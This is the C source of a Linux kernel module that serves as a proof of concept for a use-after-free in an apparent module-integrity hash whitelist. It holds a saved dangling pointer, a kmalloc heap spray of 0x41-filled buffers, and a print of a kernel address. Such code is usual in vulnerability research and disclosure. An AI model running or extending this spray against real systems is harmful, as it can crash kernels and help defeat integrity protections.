// SPDX-License-Identifier: GPL-2.0-only
/*
 * Copyright (C) 2026 dere3046
 */

#define POC_NAME "poc_bug_uaf"
#define POC_DESC "inte poc hash pointer after unload"

#include "poc_common.h"

MODULE_LICENSE("GPL");
MODULE_AUTHOR("dere3046");
MODULE_DESCRIPTION(POC_DESC);

static unsigned char *saved_hash;
static unsigned char saved_first[4];
static struct delayed_work uaf_work;

static void uaf_check(struct work_struct *work)
{
	void **spray;
	int i;

	spray = kcalloc(4096, sizeof(void *), GFP_KERNEL);
	if (!spray)
		return;
	for (i = 0; i < 4096; i++) {
		spray[i] = kmalloc(88, GFP_KERNEL);
		if (spray[i])
			memset(spray[i], 0x41, 88);
	}
	poc_info("after unload first=%02x%02x%02x%02x now=%02x%02x%02x%02x",
		 saved_first[0], saved_first[1], saved_first[2], saved_first[3],
		 saved_hash[0], saved_hash[1], saved_hash[2], saved_hash[3]);
	for (i = 0; i < 4096; i++)
		kfree(spray[i]);
	kfree(spray);
}

static int __init poc_init(void)
{
	const char *name = poc_target_name ? poc_target_name : "testmod_trusted.ko";
	int ret;

	ret = poc_init_common();
	if (ret)
		return ret;
	if (!poc_find_hash)
		return -EINVAL;
	saved_hash = poc_call_find_hash((void *)poc_find_hash, name);
	if (!saved_hash) {
		poc_err("whitelist node not found");
		return -ENOENT;
	}
	memcpy(saved_first, saved_hash, sizeof(saved_first));
	INIT_DELAYED_WORK(&uaf_work, uaf_check);
	schedule_delayed_work(&uaf_work, 6 * HZ);
	poc_info("hash pointer %px", saved_hash);
	return 0;
}

static void __exit poc_exit(void)
{
	cancel_delayed_work_sync(&uaf_work);
	poc_exit_common();
}

module_init(poc_init);
module_exit(poc_exit);
